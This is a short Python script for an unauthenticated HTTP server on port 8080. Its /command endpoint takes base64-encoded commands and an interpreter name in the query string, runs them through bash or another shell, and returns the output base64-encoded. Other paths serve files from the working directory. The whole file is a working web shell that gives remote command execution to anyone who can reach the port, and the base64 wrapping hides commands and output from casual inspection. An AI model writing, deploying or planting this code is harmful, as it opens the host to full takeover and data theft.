#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from base64 import b64encode, b64decode
from subprocess import Popen, PIPE

# Helper    
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

# Exec
def exec(command=None, interpreter=None):
    # Args
    if not command: command = "whoami; hostname;"
    if not interpreter: interpreter = "bash"
    # Exec
    process = Popen([interpreter, "-c", command], stdout=PIPE, stderr=PIPE)
    # Response
    stdout, stderr = process.communicate()
    stdout = stdout.decode("utf-8")
    stderr = stderr.decode("utf-8")
    # Done
    return stdout, stderr
    
# Server
class Lightweight(SimpleHTTPRequestHandler):

    def do_GET(self):
        # URL check
        url = urlparse(self.path)
        if url.path != "/command": return super().do_GET()
        # Command
        result = None
        try:
            # Params
            params = parse_qs(url.query)
            command = from_base64("".join(params.get("cmd") or []))
            interpreter = from_base64("".join(params.get("shell") or []))
            # Exec
            stdout, stderr = exec(command=command, interpreter=interpreter)
            result = to_base64(stdout, to_bytes=True)
            # Success
            self.send_response(200)
        except Exception as e:
            # Failure
            self.send_response(400)
            raise e
            print(e)
        # Headers
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        # Result
        if result: self.wfile.write(result)
        # Done
    
    def do_POST(self):
        print(self.__dict__)

def main():
    try:
        lightweight_httpd = HTTPServer(('', 8080), Lightweight)
        lightweight_httpd.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__': main()